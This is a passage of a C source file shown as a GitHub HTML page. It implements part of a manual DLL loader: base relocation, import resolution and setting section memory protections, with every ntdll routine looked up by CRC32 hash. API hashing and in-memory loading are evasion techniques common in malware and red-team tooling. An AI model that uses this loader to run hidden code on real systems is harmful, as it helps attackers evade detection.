          <td id="file-main-c-LC78" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">void</span> *p_nt_read_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtReadVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L79" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="79"></td>
          <td id="file-main-c-LC79" class="blob-code blob-code-inner js-file-line">            NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t) p_nt_read_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-main-c-L80" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="80"></td>
          <td id="file-main-c-LC80" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_read_virtual_memory</span>(<span class="pl-c1">NtCurrentProcess</span>(), (<span class="pl-k">void</span> *)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + relocation_rva), &amp;address_to_patch, <span class="pl-k">sizeof</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>), <span class="pl-c1">NULL</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L81" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="81"></td>
          <td id="file-main-c-LC81" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">return</span> -<span class="pl-c1">5</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L82" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="82"></td>
          <td id="file-main-c-LC82" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L83" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="83"></td>
          <td id="file-main-c-LC83" class="blob-code blob-code-inner js-file-line">            address_to_patch += delta_image_base;</td>
        </tr>
        <tr>
          <td id="file-main-c-L84" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="84"></td>
          <td id="file-main-c-LC84" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + relocation_rva), &amp;address_to_patch, <span class="pl-k">sizeof</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>));</td>
        </tr>
        <tr>
          <td id="file-main-c-L85" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="85"></td>
          <td id="file-main-c-LC85" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-main-c-L86" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="86"></td>
          <td id="file-main-c-LC86" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-main-c-L87" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="87"></td>
          <td id="file-main-c-LC87" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L88" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="88"></td>
          <td id="file-main-c-LC88" class="blob-code blob-code-inner js-file-line">    PIMAGE_IMPORT_DESCRIPTOR import_descriptor;</td>
        </tr>
        <tr>
          <td id="file-main-c-L89" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="89"></td>
          <td id="file-main-c-LC89" class="blob-code blob-code-inner js-file-line">    IMAGE_DATA_DIRECTORY images_directory = nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_IMPORT];</td>
        </tr>
        <tr>
          <td id="file-main-c-L90" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="90"></td>
          <td id="file-main-c-LC90" class="blob-code blob-code-inner js-file-line">    UNICODE_STRING import_library_name;</td>
        </tr>
        <tr>
          <td id="file-main-c-L91" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="91"></td>
          <td id="file-main-c-LC91" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L92" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="92"></td>
          <td id="file-main-c-LC92" class="blob-code blob-code-inner js-file-line">    import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.<span class="pl-smi">VirtualAddress</span> + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base);</td>
        </tr>
        <tr>
          <td id="file-main-c-L93" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="93"></td>
          <td id="file-main-c-LC93" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *current_library = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L94" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="94"></td>
          <td id="file-main-c-LC94" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L95" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="95"></td>
          <td id="file-main-c-LC95" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span>(import_descriptor-&gt;<span class="pl-smi">Name</span> != <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L96" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="96"></td>
          <td id="file-main-c-LC96" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *p_ldr_load_dll = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, LdrLoadDll_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L97" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="97"></td>
          <td id="file-main-c-LC97" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> *module_name = (<span class="pl-k">char</span> *)dll_base + import_descriptor-&gt;<span class="pl-smi">Name</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L98" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="98"></td>
          <td id="file-main-c-LC98" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">wchar_t</span> w_module_name[MAX_PATH];</td>
        </tr>
        <tr>
          <td id="file-main-c-L99" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="99"></td>
          <td id="file-main-c-LC99" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> num_converted;</td>
        </tr>
        <tr>
          <td id="file-main-c-L100" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="100"></td>
          <td id="file-main-c-LC100" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L101" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="101"></td>
          <td id="file-main-c-LC101" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *p_rtl_multi_byte_to_unicode_n = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L102" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="102"></td>
          <td id="file-main-c-LC102" class="blob-code blob-code-inner js-file-line">        RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t) p_rtl_multi_byte_to_unicode_n;</td>
        </tr>
        <tr>
          <td id="file-main-c-L103" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="103"></td>
          <td id="file-main-c-LC103" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>((status = <span class="pl-c1">g_rtl_multi_byte_to_unicode_n</span>(w_module_name, <span class="pl-k">sizeof</span>(w_module_name), &amp;num_converted, module_name, <span class="pl-c1">strlen</span>(module_name) +<span class="pl-c1">1</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L104" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="104"></td>
          <td id="file-main-c-LC104" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> -<span class="pl-c1">5</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L105" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="105"></td>
          <td id="file-main-c-LC105" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L106" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="106"></td>
          <td id="file-main-c-LC106" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">g_rtl_init_unicode_string</span>(&amp;import_library_name, w_module_name);</td>
        </tr>
        <tr>
          <td id="file-main-c-L107" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="107"></td>
          <td id="file-main-c-LC107" class="blob-code blob-code-inner js-file-line">        LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t) p_ldr_load_dll;</td>
        </tr>
        <tr>
          <td id="file-main-c-L108" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="108"></td>
          <td id="file-main-c-LC108" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>((status = <span class="pl-c1">g_ldr_load_dll</span>(<span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>, &amp;import_library_name, &amp;current_library)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L109" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="109"></td>
          <td id="file-main-c-LC109" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> -<span class="pl-c1">6</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L110" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="110"></td>
          <td id="file-main-c-LC110" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L111" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="111"></td>
          <td id="file-main-c-LC111" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (current_library){</td>
        </tr>
        <tr>
          <td id="file-main-c-L112" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="112"></td>
          <td id="file-main-c-LC112" class="blob-code blob-code-inner js-file-line">            ANSI_STRING a_string;</td>
        </tr>
        <tr>
          <td id="file-main-c-L113" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="113"></td>
          <td id="file-main-c-LC113" class="blob-code blob-code-inner js-file-line">            PIMAGE_THUNK_DATA thunk = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L114" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="114"></td>
          <td id="file-main-c-LC114" class="blob-code blob-code-inner js-file-line">            PIMAGE_THUNK_DATA original_thunk = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L115" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="115"></td>
          <td id="file-main-c-LC115" class="blob-code blob-code-inner js-file-line">            thunk = (PIMAGE_THUNK_DATA)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + import_descriptor-&gt;<span class="pl-smi">FirstThunk</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L116" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="116"></td>
          <td id="file-main-c-LC116" class="blob-code blob-code-inner js-file-line">            original_thunk = (PIMAGE_THUNK_DATA)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + import_descriptor-&gt;<span class="pl-smi">OriginalFirstThunk</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L117" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="117"></td>
          <td id="file-main-c-LC117" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> (thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span> != <span class="pl-c1">0</span>){</td>
        </tr>
        <tr>
          <td id="file-main-c-L118" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="118"></td>
          <td id="file-main-c-LC118" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">void</span> *p_ldr_get_procedure_address = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, LdrGetProcedureAddress_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L119" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="119"></td>
          <td id="file-main-c-LC119" class="blob-code blob-code-inner js-file-line">                LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t) p_ldr_get_procedure_address;</td>
        </tr>
        <tr>
          <td id="file-main-c-L120" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="120"></td>
          <td id="file-main-c-LC120" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> (<span class="pl-c1">IMAGE_SNAP_BY_ORDINAL</span>(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>)) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L121" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="121"></td>
          <td id="file-main-c-LC121" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">g_ldr_get_procedure_address</span>(current_library, <span class="pl-c1">NULL</span>, (WORD) original_thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>, (PVOID *) &amp;(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span>));</td>
        </tr>
        <tr>
          <td id="file-main-c-L122" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="122"></td>
          <td id="file-main-c-LC122" class="blob-code blob-code-inner js-file-line">                } <span class="pl-k">else</span> {</td>
        </tr>
        <tr>
          <td id="file-main-c-L123" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="123"></td>
          <td id="file-main-c-LC123" class="blob-code blob-code-inner js-file-line">                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L124" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="124"></td>
          <td id="file-main-c-LC124" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">FILL_STRING</span>(a_string, functionName-&gt;<span class="pl-smi">Name</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L125" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="125"></td>
          <td id="file-main-c-LC125" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">g_ldr_get_procedure_address</span>(current_library, &amp;a_string, <span class="pl-c1">0</span>, (PVOID *) &amp;(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span>));</td>
        </tr>
        <tr>
          <td id="file-main-c-L126" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="126"></td>
          <td id="file-main-c-LC126" class="blob-code blob-code-inner js-file-line">                }</td>
        </tr>
        <tr>
          <td id="file-main-c-L127" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="127"></td>
          <td id="file-main-c-LC127" class="blob-code blob-code-inner js-file-line">                ++thunk;</td>
        </tr>
        <tr>
          <td id="file-main-c-L128" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="128"></td>
          <td id="file-main-c-LC128" class="blob-code blob-code-inner js-file-line">                ++original_thunk;</td>
        </tr>
        <tr>
          <td id="file-main-c-L129" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="129"></td>
          <td id="file-main-c-LC129" class="blob-code blob-code-inner js-file-line">            }</td>
        </tr>
        <tr>
          <td id="file-main-c-L130" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="130"></td>
          <td id="file-main-c-LC130" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-main-c-L131" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="131"></td>
          <td id="file-main-c-LC131" class="blob-code blob-code-inner js-file-line">        import_descriptor++;</td>
        </tr>
        <tr>
          <td id="file-main-c-L132" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="132"></td>
          <td id="file-main-c-LC132" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-main-c-L133" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="133"></td>
          <td id="file-main-c-LC133" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L134" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="134"></td>
          <td id="file-main-c-LC134" class="blob-code blob-code-inner js-file-line">    PIMAGE_SECTION_HEADER section_header = <span class="pl-c1">IMAGE_FIRST_SECTION</span>(nt_headers);</td>
        </tr>
        <tr>
          <td id="file-main-c-L135" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="135"></td>
          <td id="file-main-c-LC135" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; nt_headers-&gt;<span class="pl-smi">FileHeader</span>.<span class="pl-smi">NumberOfSections</span>; i++, section_header++) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L136" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="136"></td>
          <td id="file-main-c-LC136" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (section_header-&gt;<span class="pl-smi">SizeOfRawData</span>) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L137" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="137"></td>
          <td id="file-main-c-LC137" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> executable = (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_EXECUTE) != <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L138" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="138"></td>
          <td id="file-main-c-LC138" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> readable = (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_READ) != <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L139" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="139"></td>
          <td id="file-main-c-LC139" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> writeable = (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_WRITE) != <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L140" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="140"></td>
          <td id="file-main-c-LC140" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> protect = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L141" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="141"></td>
          <td id="file-main-c-LC141" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L142" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="142"></td>
          <td id="file-main-c-LC142" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (!executable &amp;&amp; !readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-main-c-L143" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="143"></td>
          <td id="file-main-c-LC143" class="blob-code blob-code-inner js-file-line">                protect = PAGE_NOACCESS;</td>
        </tr>
        <tr>
          <td id="file-main-c-L144" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="144"></td>
          <td id="file-main-c-LC144" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (!executable &amp;&amp; !readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-main-c-L145" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="145"></td>
          <td id="file-main-c-LC145" class="blob-code blob-code-inner js-file-line">                protect = PAGE_WRITECOPY;</td>
        </tr>
        <tr>
          <td id="file-main-c-L146" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="146"></td>
          <td id="file-main-c-LC146" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (!executable &amp;&amp; readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-main-c-L147" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="147"></td>
          <td id="file-main-c-LC147" class="blob-code blob-code-inner js-file-line">                protect = PAGE_READONLY;</td>
        </tr>
        <tr>
          <td id="file-main-c-L148" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="148"></td>
          <td id="file-main-c-LC148" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (!executable &amp;&amp; readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-main-c-L149" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="149"></td>
          <td id="file-main-c-LC149" class="blob-code blob-code-inner js-file-line">                protect = PAGE_READWRITE;</td>
        </tr>
        <tr>
          <td id="file-main-c-L150" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="150"></td>
          <td id="file-main-c-LC150" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; !readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-main-c-L151" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="151"></td>
          <td id="file-main-c-LC151" class="blob-code blob-code-inner js-file-line">                protect = PAGE_EXECUTE;</td>
        </tr>
        <tr>
          <td id="file-main-c-L152" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="152"></td>
          <td id="file-main-c-LC152" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; !readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-main-c-L153" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="153"></td>
          <td id="file-main-c-LC153" class="blob-code blob-code-inner js-file-line">                protect = PAGE_EXECUTE_WRITECOPY;</td>
        </tr>
        <tr>
          <td id="file-main-c-L154" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="154"></td>
          <td id="file-main-c-LC154" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-main-c-L155" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="155"></td>
          <td id="file-main-c-LC155" class="blob-code blob-code-inner js-file-line">                protect = PAGE_EXECUTE_READ;</td>
        </tr>
        <tr>
          <td id="file-main-c-L156" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="156"></td>
          <td id="file-main-c-LC156" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-main-c-L157" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="157"></td>
          <td id="file-main-c-LC157" class="blob-code blob-code-inner js-file-line">                protect = PAGE_EXECUTE_READWRITE;</td>
        </tr>
        <tr>
          <td id="file-main-c-L158" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="158"></td>
          <td id="file-main-c-LC158" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L159" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="159"></td>
          <td id="file-main-c-LC159" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_NOT_CACHED)</td>
        </tr>
        <tr>
          <td id="file-main-c-L160" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="160"></td>
          <td id="file-main-c-LC160" class="blob-code blob-code-inner js-file-line">                protect |= PAGE_NOCACHE;</td>
        </tr>
        <tr>
          <td id="file-main-c-L161" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="161"></td>
          <td id="file-main-c-LC161" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L162" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="162"></td>
          <td id="file-main-c-LC162" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">void</span> *p_nt_protect_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtProtectVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L163" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="163"></td>
          <td id="file-main-c-LC163" class="blob-code blob-code-inner js-file-line">            NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-main-c-L164" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="164"></td>
          <td id="file-main-c-LC164" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">size_t</span> size = section_header-&gt;<span class="pl-smi">SizeOfRawData</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L165" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="165"></td>
          <td id="file-main-c-LC165" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">void</span> *address = dll_base + section_header-&gt;<span class="pl-smi">VirtualAddress</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L166" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="166"></td>
          <td id="file-main-c-LC166" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_protect_virtual_memory</span>(<span class="pl-c1">NtCurrentProcess</span>(), &amp;address, &amp;size, protect, &amp;protect)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-main-c-L167" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="167"></td>
          <td id="file-main-c-LC167" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">return</span> -<span class="pl-c1">7</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L168" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="168"></td>
          <td id="file-main-c-LC168" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-main-c-L169" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="169"></td>
          <td id="file-main-c-LC169" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-main-c-L170" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="170"></td>
          <td id="file-main-c-LC170" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L171" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="171"></td>
          <td id="file-main-c-LC171" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_flush_instruction_cache = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtFlushInstructionCache_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L172" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="172"></td>
          <td id="file-main-c-LC172" class="blob-code blob-code-inner js-file-line">    NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t) p_nt_flush_instruction_cache;</td>
        </tr>
        <tr>
          <td id="file-main-c-L173" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="173"></td>
          <td id="file-main-c-LC173" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">g_nt_flush_instruction_cache</span>((HANDLE) -<span class="pl-c1">1</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L174" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="174"></td>
          <td id="file-main-c-LC174" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
